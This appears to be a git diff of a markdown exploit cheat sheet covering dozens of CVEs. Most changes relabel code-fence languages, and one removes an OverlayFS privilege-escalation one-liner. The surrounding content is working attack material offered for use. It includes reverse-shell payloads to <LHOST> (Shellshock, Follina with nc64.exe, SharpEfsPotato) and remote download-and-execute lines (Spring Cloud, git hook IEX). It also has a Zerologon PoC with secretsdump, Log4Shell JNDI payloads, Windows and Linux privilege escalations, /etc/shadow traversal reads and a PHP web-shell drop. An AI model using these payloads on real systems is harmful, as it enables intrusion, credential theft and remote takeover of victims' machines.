@@ -246,13 +246,13 @@ int main() {
 }
 ```
 
-```c
+```console
 $ gcc <FILE>.c -static
 ```
 
 ## CVE-2014-6271: Shellshock RCE PoC
 
-```c
+```console
 $ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
 ```
 
@@ -260,7 +260,7 @@ $ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http
 
 - exim version <= 4.84-3
 
-```c
+```bash
 #!/bin/sh
 # CVE-2016-1531 exim <= 4.84-3 local root exploit
 # ===============================================
@@ -296,7 +296,7 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
 
 ### Exploitation
 
-```c
+```console
 !root:
 $ sudo -u#-1 /bin/bash
 ```
@@ -309,7 +309,7 @@ $ sudo -u#-1 /bin/bash
 
 ### Prerequisites
 
-```c
+```console
 $ python3 -m pip install virtualenv
 $ python3 -m virtualenv venv
 $ source venv/bin/activate
@@ -318,7 +318,7 @@ $ pip install git+https://github.com/SecureAuthCorp/impacket
 
 ### PoC Modification
 
-```c
+```python
     newPassRequest = nrpc.NetrServerPasswordSet2()
     newPassRequest['PrimaryName'] = dc_handle + '\x00'
     newPassRequest['AccountName'] = target_computer + '$\x00'
@@ -334,7 +334,7 @@ $ pip install git+https://github.com/SecureAuthCorp/impacket
 
 ### Weaponized PoC
 
-```c
+```python
 #!/usr/bin/env python3
 
 from impacket.dcerpc.v5 import nrpc, epm
@@ -436,7 +436,7 @@ if __name__ == '__main__':
 
 ### Execution
 
-```c
+```console
 $ python3 zerologon_tester.py <HANDLE> <RHOST>
 $ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
@@ -454,13 +454,13 @@ $ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
 
 ### Vulnerability Test
 
-```c
+```console
 $ sudoedit -s /
 ```
 
 The machine is vulnerable if one of the following message is shown.
 
-```c
+```console
 sudoedit: /: not a regular file
 segfault
 ```
@@ -469,11 +469,11 @@ Not vulnerable if the error message starts with `usage:`.
 
 ## CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)
 
-```c
+```console
 $ curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
 ```
 
-```c
+```console
 $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
 ```
 
@@ -487,7 +487,7 @@ $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure
 
 ### Execution
 
-```c
+```console
 $ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../etc/passwd' --path-as-is
 $ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
 ```
@@ -496,7 +496,7 @@ $ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/l
 
 ### Testing
 
-```c
+```console
 $ cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
 ```
 
@@ -508,7 +508,7 @@ File: jdk-8u181-linux-x64.tar.gz
 
 ### Creating Library Folder
 
-```c
+```console
 $ sudo mkdir /usr/lib/jvm
 $ cd /usr/lib/jvm
 $ sudo tar xzvf /usr/lib/jvm/jdk-8u181-linux-x64.tar.gz
@@ -522,13 +522,13 @@ $ sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
 
 ### Verify Version
 
-```c
+```console
 $ java -version
 ```
 
 ### Get Exploit Framework
 
-```c
+```console
 $ git clone https://github.com/mbechler/marshalsec
 $ cd /opt/08_exploitation_tools/marshalsec/
 $ sudo apt-get install maven
@@ -537,7 +537,7 @@ $ mvn clean package -DskipTests
 
 ### Exploit.java
 
-```c
+```java
 public class Exploit {
     static {
         try {
@@ -551,31 +551,31 @@ public class Exploit {
 
 ### Compiling Exploit.java
 
-```c
+```console
 $ javac Exploit.java -source 8 -target 8
 ```
 
 ### Start Pyhton3 HTTP Server
 
-```c
+```console
 $ python3 -m http.server 80
 ```
 
 ### Starting the malicious LDAP Server
 
-```c
+```console
 $ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:80/#Exploit"
 ```
 
 ### Start local netcat listener
 
-```c
+```console
 $ nc -lnvp 9001
 ```
 
 ### Execution
 
-```c
+```console
 $ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
 ```
 
@@ -583,15 +583,15 @@ $ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exp
 
 > https://github.com/welk1n/JNDI-Injection-Exploit
 
-```c
+```console
 $ wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
 ```
 
-```c
+```console
 $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
 ```
 
-```c
+```console
 ${jndi:ldap://<LHOST>:1389/ci1dfd}
 ```
 
@@ -603,39 +603,39 @@ ${jndi:ldap://<LHOST>:1389/ci1dfd}
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
-```c
+```console
 $ tar -xvf jdk-8u20-linux-x64.tar.gz
 ```
 
 ##### Start the Listener
 
-```c
+```console
 $ python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
 ```
 
 ##### Execution
 
-```c
+```console
 ${jndi:ldap://<LHOST>:1389/foobar}
 ```
 
 ## CVE-2022-0847: Dirty Pipe LPE
 
-```c
+```console
 $ gcc -o dirtypipe dirtypipe.c
 $ ./dirtypipe /etc/passwd 1 ootz:
 $ su rootz
 ```
 
-## CVE-2022-1040: Sophos XG Authentication Bypass RCE
+## CVE-2022-1040: Sophos XG Firewall Authentication Bypass RCE
 
-```c
+```console
 $ curl -sk -H "X-Requested-With: XMLHttpRequest" -X POST 'https://<RHOST>/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"foobar"\}' | grep -q 'Session Expired'
 ```
 
 ## CVE-2022-21675: Zip Slip
 
-```c
+```console
 $ ln -s ../../../../../../../../../../etc/passwd <FILE>.pdf
 $ zip --symlink <FILE>.zip <FILE>.pdf
 $ curl http://<RHOST>/<FILE>.pdf
@@ -645,11 +645,11 @@ $ curl http://<RHOST>/<FILE>.pdf
 
 > https://github.com/me2nuk/CVE-2022-22963
 
-```c
+```console
 $ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
-```c
+```console
 $ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
@@ -665,7 +665,7 @@ from git import Repo
 r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
 ```
 
-```c
+```console
 $ <FILE>.py 'ext::sh -c chmod% +s% /bin/bash'
 ```
 
@@ -673,19 +673,19 @@ $ <FILE>.py 'ext::sh -c chmod% +s% /bin/bash'
 
 > https://github.com/JohnHammond/msdt-follina
 
-```c
+```console
 $ python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
 ```
 
-```c
+```console
 $ python3 -m http.server 8000
 ```
 
-```c
+```console
 $ nc -lnvp <LPORT>
 ```
 
-```c
+```console
 $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 ```
 
@@ -695,7 +695,7 @@ $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 
 > https://www.openwall.com/lists/oss-security/2022/06/08/10
 
-```c
+```python
 #!/usr/bin/python3
 
 # Author: Matthias Gerstner <matthias.gerstner () suse com>
@@ -934,14 +934,14 @@ while True:
 
 #### First Terminal
 
-```c
+```console
 $ ./firejoin_py.bin
 You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
 ```
 
 #### Second Terminal
 
-```c
+```console
 $ firejail --join=193982
 $ su
 ```
@@ -950,15 +950,15 @@ $ su
 
 > https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC
 
-```c
+```console
 $ sudo apt-get install pngcrush imagemagick exiftool exiv2
 ```
 
-```c
+```console
 $ pngcrush -text a "profile" "<FILE>" <FILE.png
 ```
 
-```c
+```console
 -----------------------------299057355710558143811161967686
 Content-Disposition: form-data; name="srcFormat"
 
@@ -973,7 +973,7 @@ png:- -write uploads/<FILE>.png
 
 - Firmware 12.4.2
 
-```c
+```console
 $ cat <FILE> | while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULNERABLE";done
 ```
 
@@ -981,7 +981,7 @@ $ cat <FILE> | while read host do;do curl -sk "http://$host:8443/images/////////
 
 ### PoC 1
 
-```c
+```python
 {% highlight Python %}
 #!/usr/bin/python
 #
@@ -1011,7 +1011,7 @@ f.close()
 
 ### PoC 2
 
-```c
+```console
 open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
 ```
 
@@ -1023,11 +1023,11 @@ open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" %
 
 Modify the following file and build the solution.
 
-```c
+```console
 StorSvc\RpcClient\RpcClient\storsvc_c.c
 ```
 
-```c
+```console
 #if defined(_M_AMD64)
 
 //#define WIN10
@@ -1038,11 +1038,11 @@ StorSvc\RpcClient\RpcClient\storsvc_c.c
 
 Modify the following file and build the solution.
 
-```c
+```console
 StorSvc\SprintCSP\SprintCSP\main.c
 ```
 
-```c
+```console
 void DoStuff() {
 
     // Replace all this code by your payload
@@ -1060,14 +1060,14 @@ void DoStuff() {
 
 First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.
 
-```c
+```console
 C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
 C:\> LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
 ```
 
 At least trigger `StorSvc` via `RpcClient.exe`.
 
-```c
+```console
 C:\> RpcClient.exe
 ```
 
@@ -1077,12 +1077,12 @@ C:\> RpcClient.exe
 
 ### Manual Exploitation
 
-```c
+```console
 http://<RHOST>/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
 http://<RHOST>/setup/setupadministrator-start.action
 ```
 
-```c
+```console
 $ curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://<RHOST>/setup/setupadministrator.action
 ```
 
@@ -1097,23 +1097,23 @@ $ curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fu
 
 ### Example
 
-```c
+```console
 test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
 ```
 
 ### Exploitation
 
-```c
+```console
 EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
 ```
 
-```c
+```console
 $ sudoedit /etc/motd
 ```
 
 ## CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)
 
-```c
+```console
 PS C:\> Import-Module .\CVE-2023-23397.ps1
 PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
@@ -1124,12 +1124,8 @@ PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<F
 
 - Linux ubuntu2204 5.19.0-46-generic
 
-```c
+```console
 $ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
-```
-
-```c
-$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
 ```
 
 ## CVE-2023-38146: ThemeBleed RCE
@@ -1142,7 +1138,7 @@ Create a new `C++ Console Application`.
 
 Source Files > Add > New Item...
 
-```c
+```cpp
 #include "pch.h"
 #include <stdio.h>
 #include <string.h>
@@ -1227,11 +1223,11 @@ extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
 
 ```
 
-```c
+```console
 PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
 ```
 
-```c
+```console
 PS C:\> .\ThemeBleed.exe server
 ```
 
@@ -1239,11 +1235,11 @@ PS C:\> .\ThemeBleed.exe server
 
 > https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
 
-```c
+```console
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <FILE>.elf
 ```
 
-```c
+```xml
 $ cat poc-linux.xml 
 <?xml version="1.0" encoding="UTF-8" ?>
 <beans xmlns="http://www.springframework.org/schema/beans"
@@ -1263,7 +1259,7 @@ $ cat poc-linux.xml
 </beans>
 ```
 
-```c
+```console
 $ go run main.go -i <RHOST> -p 61616 -u http://<LHOST>/poc-linux.xml
 ```
 
@@ -1271,7 +1267,7 @@ $ go run main.go -i <RHOST> -p 61616 -u http://<LHOST>/poc-linux.xml
 
 > https://github.com/leesh3288/CVE-2023-4911
 
-```c
+```console
 $ python3 gen_libc.py 
 [*] '/lib/x86_64-linux-gnu/libc.so.6'
     Arch:     amd64-64-little
@@ -1281,7 +1277,7 @@ $ python3 gen_libc.py
     PIE:      PIE enabled
 ```
 
-```c
+```console
 $ gcc -o exp exp.c
 $ ./exp
 ```
@@ -1294,13 +1290,13 @@ $ ./exp
 
 ### PoC
 
-```c
+```console
 user[email][]=valid@email.com&user[email][]=attacker@email.com
 ```
 
 ### Modified PoC from TryHackMe
 
-```c
+```python
 import requests
 import argparse
 from urllib.parse import urlparse, urlencode
@@ -1375,7 +1371,7 @@ if __name__ == '__main__':
     exploit = CVE_2023_7028(
         url=args.url,
         target=args.target,
-		evil=args.evil
+        evil=args.evil
     )
     if not exploit.ask_reset():
         exit()
@@ -1383,7 +1379,7 @@ if __name__ == '__main__':
 
 ### Execution
 
-```c
+```console
 $ python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
 ```
 
@@ -1393,7 +1389,7 @@ $ python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
 
 > https://github.com/watchtowrlabs/CVE-2024-4577
 
-```c
+```python
 """
 PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
 Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
@@ -1402,13 +1398,13 @@ Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-
 Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
 """
 
-banner = """			 __         ___  ___________                   
-	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
-	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
-	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
-	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
-				  \\/          \\/     \\/                            
-	  
+banner = """             __         ___  ___________                   
+     __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
+     \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
+      \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
+       \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
+                  \\/          \\/     \\/                            
+      
         watchTowr-vs-php_cve-2024-4577.py
         (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
           - Aliz Hammond, watchTowr (aliz@watchTowr.com)
@@ -1452,17 +1448,17 @@ else:
 
 ### Vulnerability Verification
 
-```c
+```console
 PS C:\> sc qc VSStandardCollectorService150
 ```
 
 ### Potential Changes
 
-```c
+```console
 WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
 ```
 
-```c
+```console
 void cb1()
 {
     printf("[*] Oplock!\n");
@@ -1694,7 +1690,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
 }
 ```
 
-```c
+```console
 $ ruler --insecure --username <DOMAIN>/<USERNAME> --password <PASSWORD> --email <EMAIL> --url <AUTODISCOVER> form add-com --sufix <FORM> --dll ./<FILE>.dll --name <DLL> --body "foobar"
 ```
 
@@ -1706,7 +1702,7 @@ $ ruler --insecure --username <DOMAIN>/<USERNAME> --password <PASSWORD> --email 
 
 #### Dockerfile
 
-```c
+```console
 FROM ubuntu:20.04
 RUN apt-get update -y && apt-get install netcat -y
 ADD ./poc.sh /poc.sh
@@ -1715,7 +1711,7 @@ WORKDIR /proc/self/fd/9
 
 #### poc.sh
 
-```c
+```bash
 #!/bin/bash
 ip=$(hostname -I | awk '{print $1}')
 port=<LPORT>
@@ -1728,7 +1724,7 @@ EOF
 
 #### verify.sh
 
-```c
+```bash
 #! /bin/bash
 for i in {4..20}; do
     docker run -it --rm -w /proc/self/fd/$i ubuntu:20.04 bash -c "cat /proc/self/cwd/../../../etc/passwd"
@@ -1737,7 +1733,7 @@ done
 
 ### Malicious YAML File
 
-```c
+```yaml
 apiVersion: v1
 kind: Pod
 metadata:
@@ -1755,7 +1751,7 @@ It can be the case that the `file descriptor` needs to be incremented until it s
 
 #### Inside the container
 
-```c
+```console
 $ cat ../../../../etc/shadow
 ```
 
@@ -1763,7 +1759,7 @@ $ cat ../../../../etc/shadow
 
 > https://github.com/CKevens/CVE-2024-23897
 
-```c
+```console
 $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/etc/passwd"
 $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/proc/self/environ"
 $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/users.xml"
@@ -1772,7 +1768,7 @@ $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect
 
 ## CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)
 
-```c
+```console
 POST /clients/MyCRL HTTP/1.1
 Host: <RHOST>
 Content-Length: 39
@@ -1788,20 +1784,20 @@ aCSHELL/../../../../../../../etc/shadow
 
 ### Hook Repository
 
-```c
+```console
 $ git clone http://<RHOST>:3000/<USERNAME>/hook.git
 $ cd hook
 $ mkdir -p y/hooks
 ```
 
-```c
+```console
 $ cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')"
 EOF
 ```
 
-```c
+```console
 $ chmod +x y/hooks/post-checkout
 $ git add y/hooks/post-checkout
 $ git commit -m "post-checkout"
@@ -1810,7 +1806,7 @@ $ git push
 
 ### RCE Repository
 
-```c
+```console
 $ git clone http://<RHOST>:3000/<USERNAME>/git_rce.git
 $ git submodule add --name x/y http://<RHOST>:3000/<USERNAME>/hook.git A/modules/x
 $ git commit -m "Add submodule"
@@ -1824,11 +1820,11 @@ $ git push
 
 Compile the project for `Remote Code Execution (RCE)`.
 
-## CVE-2024-47176: EvilCUPS RCE
+## CVE-2024-47176: EvilCUPS
 
 > https://github.com/IppSec/evil-cups
 
-```c
+```python
 #!/usr/bin/env python3
 # Based off of EvilSocket's Exploit Script
 # Few changes to make it more relaible
@@ -2072,7 +2068,7 @@ if __name__ == "__main__":
 
 > https://github.com/BeichenDream/GodPotato
 
-```c
+```console
 PS C:\> .\GodPotato-NET2.exe -cmd '<COMMAND>'
 PS C:\> .\GodPotato-NET35.exe -cmd '<COMMAND>'
 PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
@@ -2086,7 +2082,7 @@ PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
 
 ### GetCLSID.ps1
 
-```c
+```console
 <#
 This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
 Then exports to CSV
@@ -2149,7 +2145,7 @@ $RESULT | ogv
 
 ### Execution
 
-```c
+```console
 PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
@@ -2157,7 +2153,7 @@ PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p
 
 > https://github.com/antonioCoco/JuicyPotatoNG
 
-```c
+```console
 PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
@@ -2165,16 +2161,16 @@ PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 
 > https://www.exploit-db.com/exploits/1518
 
-```c
+```console
 $ gcc -g -c raptor_udf2.c -fPIC
 $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 
-```c
+```console
 $ mysql -u root
 ```
 
-```c
+```console
 > use mysql;
 > create table foo(line blob);
 > insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
@@ -2187,7 +2183,7 @@ $ mysql -u root
 
 > https://github.com/itm4n/PrintSpoofer
 
-```c
+```console
 PS C:\> .\PrintSpoofer.exe -i -c powershell
 ```
 
@@ -2195,11 +2191,11 @@ PS C:\> .\PrintSpoofer.exe -i -c powershell
 
 > https://github.com/antonioCoco/RemotePotato0
 
-```c
+```console
 $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<RHOST>:<LPORT>
 ```
 
-```c
+```console
 PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
 ```
 
@@ -2207,7 +2203,7 @@ PS C:\> .\RemotePotato0.exe -m 2 -r <LHOST> -x <LHOST> -p <LPORT> -s 1
 
 > https://github.com/bugch3ck/SharpEfsPotato
 
-```c
+```console
 PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
@@ -2228,7 +2224,7 @@ PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powersh
 
 ### Compiling
 
-```c
+```console
 $ gcc shocker.c -o shocker
 $ cc -Wall -std=c99 -O2 shocker.c -static
 ```
@@ -2237,7 +2233,7 @@ $ cc -Wall -std=c99 -O2 shocker.c -static
 
 > https://github.com/Mr-xn/thinkphp_lang_RCE
 
-```c
+```console
 /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami
 /?page=/usr/local/lib/php/pearcmd&whoami
 /?page=/usr/local/lib/php/pearcmd&/<?=system($_GET['cmd']);?>+/var/www/html/uploads/<FILE>.php
